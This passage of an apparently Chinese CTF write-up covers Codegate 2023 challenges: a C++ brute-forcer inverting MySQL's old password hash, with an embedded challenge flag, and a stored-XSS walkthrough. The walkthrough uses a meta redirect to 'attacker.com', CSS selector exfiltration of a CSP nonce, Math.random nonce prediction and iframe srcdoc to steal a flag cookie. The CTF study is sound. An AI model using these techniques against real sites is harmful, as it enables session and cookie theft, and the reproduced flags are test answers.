class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">oldpw_rev</span><span class="params">(<span class="type">uint32_t</span> *pnr, <span class="type">uint32_t</span> *pnr2, <span class="type">uint32_t</span> add,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">unsigned</span> <span class="type">char</span> *cc, <span class="type">unsigned</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> nr, nr2;</span><br><span class="line">    <span class="type">uint32_t</span> c, u, e, y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nr = *pnr;</span><br><span class="line">    nr2 = *pnr2;</span><br><span class="line">    c = cc[len - <span class="number">1</span>];</span><br><span class="line">    add -= c;</span><br><span class="line"></span><br><span class="line">    u = nr2 - nr;</span><br><span class="line">    u = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    u = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    nr2 = nr2 - ((u &lt;&lt; <span class="number">8</span>) ^ nr);</span><br><span class="line">    nr2 &amp;= <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    y = nr;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="number">0</span>; e &lt; <span class="number">64</span>; e ++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> z, g;</span><br><span class="line"></span><br><span class="line">        z = (e + add) * c;</span><br><span class="line">        g = (e ^ z) &amp; <span class="number">0x3F</span>;</span><br><span class="line">        <span class="keyword">if</span> (g == (y &amp; <span class="number">0x3F</span>)) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> x;</span><br><span class="line"></span><br><span class="line">            x = e;</span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            x = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            nr = y ^ (z + (x &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            nr &amp;= <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">oldpw_rev</span>(&amp;nr, &amp;nr2, add, cc, len - <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                *pnr = nr;</span><br><span class="line">                *pnr2 = nr2;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">forward</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *cc, <span class="type">unsigned</span> len, <span class="type">uint32_t</span> *nr, <span class="type">uint32_t</span> *nr2, <span class="type">uint32_t</span> *add)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> tmp;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cc[i] == <span class="string">&#x27; &#x27;</span> || cc[i] == <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        tmp = cc[i];</span><br><span class="line">        *nr ^= (((*nr &amp; <span class="number">63</span>) + *add) * tmp) + (*nr &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        *nr2 += (*nr2 &lt;&lt; <span class="number">8</span> ) ^ *nr;</span><br><span class="line">        *add += tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> mask = (((<span class="type">uint32_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - (<span class="type">uint32_t</span>)<span class="number">1</span>); <span class="comment">// 111....11, 31bits</span></span><br><span class="line">    *nr &amp;= mask;</span><br><span class="line">    *nr2 &amp;= mask;</span><br><span class="line">    <span class="comment">// printf(&quot;hash: %x %x\n&quot;, *nr, *nr2);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *cc, <span class="type">unsigned</span> len, <span class="type">uint32_t</span> *nr, <span class="type">uint32_t</span> *nr2)</span> </span>&#123;</span><br><span class="line">*nr = <span class="number">1345345333</span>;</span><br><span class="line">*nr2 = <span class="number">0x12345671</span>;</span><br><span class="line">    <span class="type">uint32_t</span> add = <span class="number">7</span>;</span><br><span class="line">    forward(cc, len, nr, nr2, &amp;add);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Ans</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pair_hash</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line">    <span class="function">std::<span class="type">size_t</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">const</span> std::pair&lt;T1, T2&gt; &amp;pair)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">hash</span>&lt;T1&gt;()(pair.first) ^ std::<span class="built_in">hash</span>&lt;T2&gt;()(pair.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> ok_maps[<span class="number">65536</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> nr, nr2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cp[] = <span class="string">&quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&quot;</span>;</span><br><span class="line">    nr = <span class="number">1345345333</span>;</span><br><span class="line">nr2 = <span class="number">0x12345671</span>;</span><br><span class="line">    <span class="type">uint32_t</span> add = <span class="number">7</span>;</span><br><span class="line">    forward(cp, <span class="built_in">strlen</span>((<span class="type">char</span> *)cp), &amp;nr, &amp;nr2, &amp;add);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nr: %x, nr2: %x, add: %x\n&quot;</span>, nr, nr2, add);</span><br><span class="line">    <span class="type">uint32_t</span> fnr = nr, fnr2 = nr2, fadd = add;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> uadd = <span class="number">127</span> * <span class="number">6</span>, fuadd = fadd;</span><br><span class="line">    fadd += uadd;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cs[] = <span class="string">&quot;i_love_you&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::thread&gt; ths;</span><br><span class="line">    std::mutex mtx;</span><br><span class="line">    std::unordered_map&lt;std::pair&lt;<span class="type">uint32_t</span>, <span class="type">uint32_t</span>&gt;, Ans, pair_hash&gt; maps;</span><br><span class="line">    std::atomic&lt;<span class="type">int</span>&gt; cnter&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">500</span>; i &lt; <span class="number">20000</span>; i++) &#123; <span class="comment">// find possible `add` value </span></span><br><span class="line">        <span class="type">uint32_t</span> pnr = <span class="number">0x63686163</span>, pnr2 = <span class="number">0x68613230</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="built_in">oldpw_rev</span>(&amp;pnr, &amp;pnr2, i, cs, <span class="number">11</span>);</span><br><span class="line">        <span class="keyword">if</span> (ans != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        ok_maps[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++) &#123; </span><br><span class="line">        ths.<span class="built_in">emplace_back</span>([&amp;, i] &#123;</span><br><span class="line">            std::vector&lt;std::pair&lt;std::pair&lt;<span class="type">uint32_t</span>, <span class="type">uint32_t</span>&gt;, Ans&gt;&gt; all;</span><br><span class="line">            Ans cc;</span><br><span class="line">            cc.buf[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">            cc.buf[<span class="number">4</span>] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> c = <span class="number">33</span>; c &lt; <span class="number">127</span>; c++) &#123;</span><br><span class="line">                cc.buf[<span class="number">3</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">size_t</span> d = <span class="number">33</span>; d &lt; <span class="number">127</span>; d++) &#123;</span><br><span class="line">                    cc.buf[<span class="number">2</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">size_t</span> a = <span class="number">33</span>; a &lt; <span class="number">127</span>; a++) &#123;</span><br><span class="line">                        <span class="type">int</span> sumer = fadd + i + c + d + a + <span class="number">1207</span>;</span><br><span class="line">                        cc.buf[<span class="number">1</span>] = a;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">size_t</span> b = <span class="number">33</span>; b &lt; <span class="number">127</span>; b++) <span class="keyword">if</span> (ok_maps[sumer + b]) &#123;</span><br><span class="line">                            cc.buf[<span class="number">0</span>] = b;</span><br><span class="line">                            <span class="type">uint32_t</span> pnr = <span class="number">0x63686163</span>, pnr2 = <span class="number">0x68613230</span>;</span><br><span class="line">                            <span class="type">int</span> ans = <span class="built_in">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b + <span class="number">1207</span>, cs, <span class="number">11</span>); <span class="comment">// backward: suffix</span></span><br><span class="line">                            <span class="keyword">if</span> (ans != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                            ans = <span class="built_in">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b, cc.buf, <span class="number">5</span>); <span class="comment">// ... and extra 5 steps</span></span><br><span class="line">                            <span class="keyword">if</span> (ans != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                            ++cnter; </span><br><span class="line">                            all.<span class="built_in">emplace_back</span>(std::<span class="built_in">make_pair</span>(std::<span class="built_in">make_pair</span>(pnr, pnr2), cc)); <span class="comment">// possible nr/nr2 pair, record it</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            std::lock_guard&lt;std::mutex&gt; <span class="built_in">lock</span>(mtx);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;&amp;p:all) &#123;</span><br><span class="line">                maps[p.first] = p.second;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;&amp;th:ths) th.<span class="built_in">join</span>();</span><br><span class="line">    ths.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;MITM&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, cnter.<span class="built_in">load</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++) &#123; <span class="comment">// forward</span></span><br><span class="line">        ths.<span class="built_in">emplace_back</span>([&amp;, i] &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">            buf[<span class="number">0</span>] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> c = <span class="number">33</span>; c &lt; <span class="number">127</span>; c++) &#123;</span><br><span class="line">                buf[<span class="number">1</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">size_t</span> d = <span class="number">33</span>; d &lt; <span class="number">127</span>; d++) &#123;</span><br><span class="line">                    buf[<span class="number">2</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">size_t</span> a = <span class="number">33</span>; a &lt; <span class="number">127</span>; a++) &#123;</span><br><span class="line">                        buf[<span class="number">3</span>] = a;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">size_t</span> b = <span class="number">33</span>; b &lt; <span class="number">127</span>; b++) &#123;</span><br><span class="line">                            buf[<span class="number">4</span>] = b;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">size_t</span> e = <span class="number">33</span>; e &lt; <span class="number">127</span>; e++) &#123;</span><br><span class="line">                                buf[<span class="number">5</span>] = e;</span><br><span class="line">                                <span class="type">int</span> re = uadd - i - c - d - a - b - e;</span><br><span class="line">                                <span class="type">int</span> iter = <span class="number">6</span>;</span><br><span class="line">                                <span class="keyword">while</span> (re &gt;= <span class="number">33</span>) &#123; <span class="comment">// padding, to make the `add` value is `fadd`</span></span><br><span class="line">                                    <span class="type">int</span> tw = re;</span><br><span class="line">                                    <span class="keyword">if</span> (re &gt; <span class="number">126</span>) &#123;</span><br><span class="line">                                        tw = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    buf[iter++] = tw;</span><br><span class="line">                                    re -= tw;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (re != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                                buf[iter] = <span class="number">0</span>;</span><br><span class="line">                                <span class="type">uint32_t</span> nr = fnr, nr2 = fnr2, add = fuadd;</span><br><span class="line">                                forward(buf, iter, &amp;nr, &amp;nr2, &amp;add);</span><br><span class="line">                                <span class="keyword">auto</span> cc2 = std::<span class="built_in">make_pair</span>(nr, nr2);</span><br><span class="line">                                <span class="keyword">if</span> (maps.<span class="built_in">find</span>(cc2) != maps.<span class="built_in">end</span>()) &#123; <span class="comment">// GOT!!!</span></span><br><span class="line">                                    <span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s\n&quot;</span>, cp, buf, maps[cc2].buf, cs);</span><br><span class="line">                                    <span class="comment">// exit(0);</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;&amp;th:ths) th.<span class="built_in">join</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Cha’s-Diary"><a href="#Cha’s-Diary" class="headerlink" title="Cha’s Diary"></a>Cha’s Diary</h2><p>非预期了。<br>储存型XSS，允许跨域。<br>有CSP策略保护，iframe被禁止加载，需要nonce来执行脚本：<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&quot;&gt;</code><br>目标是偷cookie里的flag.<br>我们可以利用meta标签进行跳转：<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; http://attacker.com&quot;&gt;</code><br>那么我们接下来要做的就是两步：获取nonce—&gt;执行js  </p><h3 id="获取nonce"><a href="#获取nonce" class="headerlink" title="获取nonce"></a>获取nonce</h3><p>正解应该是通过注入CSS，用CSS匹配器匹配nonce属性，逐步获取nonce。<br>可能有人会好奇，每次页面刷新不是会重新生成nonce吗？但此题有一个特殊之处：传参方法是通过URL的<code>#</code>锚（哈希&#x2F;frame&#x2F;…）来传参，并通过页内js动态渲染。因此当前进后退时并不会刷新，<strong>而是调用浏览器缓存。因此nonce不会改变</strong>。<br>当时以为有<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description">nonce hiding</a>这种东西，所以没有往下尝试，结果赛后发现这似乎是个饼并未实现……当然，我们的做法是直接在新标签页fetch并拿到页面内容正则匹配，根本就不经过浏览器过滤。<br>官方的做法就是使用CSS注入每次偷一位，具体做法见<a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html">how-to-bypass-csp-nonces-with-dom-xss</a><br>核心部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">The summary of this attack is that it&#x27;s possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven&#x27;t seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:</span><br><span class="line"></span><br><span class="line">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">And then, once we get a match, repeat with:</span><br><span class="line">*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Until it exfiltrates the complete attribute.</span><br></pre></td></tr></table></figure><p>然而我们发现他只使用了<code>Math.random</code>来生成随机nonce，这完全是可以预测的：<a href="https://github.com/PwnFunction/v8-randomness-predictor">https://github.com/PwnFunction/v8-randomness-predictor</a><br><strong>于是我们新开一个标签页然后多次fetch阅读文章页面拿一堆nonce给预测器，直接就能知道下一个nonce.</strong>  </p><h3 id="执行JS"><a href="#执行JS" class="headerlink" title="执行JS"></a>执行JS</h3><p>nonce已知之后可以直接在自己VPS上发送请求创建笔记。<br>接下来要让受害者加载页面才行。这个只需要看<code>share_read.js</code>就会发现触发<code>hashchange</code>事件即可。由于缓存（前进后退缓存，bfcache）的存在，我们可以在已知nonce的标签页随便开个页面然后<code>extra.history.go(-1);</code>，并修改hash值便能再次触发post加载，让已经被回调函数删掉的事件监听器在重新运行的js中焕发第二春。<br>这时我们发现单纯插入script标签并不能被执行，因为js脚本是往页面DOM节点写入<code>innerText</code>而已。<br>经过一番神秘的摸索，大战MDN的manual，我们发现了一个神奇的属性：<code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code><br>在<a href="https://csplite.com/csp/test188/">CSP测试网站</a>中是这么说的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page</span><br></pre></td></tr></table></figure><p>也就是插入时就会执行。至此，我们得以执行插入的js代码。  </p><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>官方idea来自这篇文章，也是场上找到过的材料：<a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss">Chrome Cache to XSS</a><br>其他一些很有用的材料：<a href="http://sebastian-lekies.de/csp/bypasses.php">Collection of CSP bypasses</a><br>CSP相关测试的网站：<a href="https://csplite.com/csp/">https://csplite.com/csp/</a><br>随机数预测解法的完整服务端代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct, time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">alphabet =  <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_same_for</span>(<span class="params">alphabet</span>):</span><br><span class="line">    sames_for = []</span><br><span class="line">    alphas = <span class="built_in">len</span>(alphabet)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(alphas):</span><br><span class="line">        start = i / alphas</span><br><span class="line">        end = (i + <span class="number">1</span>) / alphas</span><br><span class="line">        float_begin = struct.pack(<span class="string">&quot;d&quot;</span>, start + <span class="number">1</span>)</span><br><span class="line">        float_end = struct.pack(<span class="string">&quot;d&quot;</span>, end + <span class="number">1</span>)</span><br><span class="line">        uint_begin = struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, float_begin)[<span class="number">0</span>] &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">52</span>) - <span class="number">1</span>)</span><br><span class="line">        uint_end = (struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, float_end)[<span class="number">0</span>] - <span class="number">1</span>) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">52</span>) - <span class="number">1</span>)</span><br><span class="line">        x, y = <span class="built_in">bin</span>(uint_begin)[<span class="number">2</span>:].zfill(<span class="number">52</span>), <span class="built_in">bin</span>(uint_end)[<span class="number">2</span>:].zfill(<span class="number">52</span>)</span><br><span class="line">        sames = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> x[sames] == y[sames]:</span><br><span class="line">            sames += <span class="number">1</span></span><br><span class="line">        sames_for.append((<span class="built_in">int</span>(x[:sames], <span class="number">2</span>) <span class="keyword">if</span> sames <span class="keyword">else</span> <span class="number">0</span>, sames))</span><br><span class="line">    <span class="keyword">return</span> sames_for</span><br><span class="line"></span><br><span class="line">sames_for = generate_same_for(alphabet)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">question, alphabet, sames_for</span>):</span><br><span class="line">    sequence = [alphabet.index(i) <span 